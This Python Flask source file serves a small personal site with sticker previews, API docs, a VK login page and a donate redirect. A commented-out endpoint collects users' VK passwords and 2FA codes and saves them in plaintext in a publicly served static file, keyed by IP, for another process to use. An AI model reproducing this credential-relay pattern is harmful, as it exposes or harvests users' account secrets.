import time

from flask import Flask, Blueprint, render_template, redirect, request, jsonify
import random as r
import json
import os

app = Flask(__name__)
me = Blueprint('me', __name__, url_prefix='/me')


@me.route('/')
def index():
    sticker_id = r.randint(58173, 58220)
    return render_template('index.html', sticker_preview=f'sticker{sticker_id}.webp',
                           sticker_lottie=f'sticker{sticker_id}.json')


@me.route('/api-docs')
def api_docs():
    with open('static/methods.json', 'r') as f:
        api_methods = json.load(f)
    return render_template('docs.html', apiMethods=api_methods)


@me.route('/AuthVK')
def auth_vk():
    return render_template('auth_vk.html')


@me.route('/donate')
def donate():
    return redirect('https://www.tinkoff.ru/cf/3Tkl3awpS5c')


# @me.route('/api/authVK', methods=["POST"])
# def apiAuthVK():
#     username, password, twofaCode, country = request.json['username'], request.json['password'], request.json[
#         'twofaCode'], request.json['country']
#     ip = request.remote_addr
#     with open('static/proxy.json', 'r', encoding='UTF-8') as f:
#         proxy = json.load(f)
#     proxy[ip] = {
#         'username': username,
#         'password': password,
#         'twofaCode': twofaCode,
#         'country': country
#     }
#     with open('static/proxy.json', 'w', encoding='UTF-8') as f:
#         json.dump(proxy, f, indent=4, ensure_ascii=False)
#     print(request.json)

#     t_s = 0
#     while True:
#         if os.path.exists(f'static/token{ip}.txt'):
#             with open(f'static/token{ip}.txt', 'r', encoding='UTF-8') as f:
#                 token = f.read()
#             return jsonify(
#                 {
#                     "is_ok": True,
#                     "object": {
#                         "token": token
#                     }
#                 }
#             )
#         if t_s >= 30:
#             break
#         t_s += 1
#         time.sleep(1)

#     return jsonify(
#         {
#             "is_ok": True
#         }
#     )


app.register_blueprint(me)

if __name__ == '__main__':
    app.run(port=80, host='0.0.0.0')
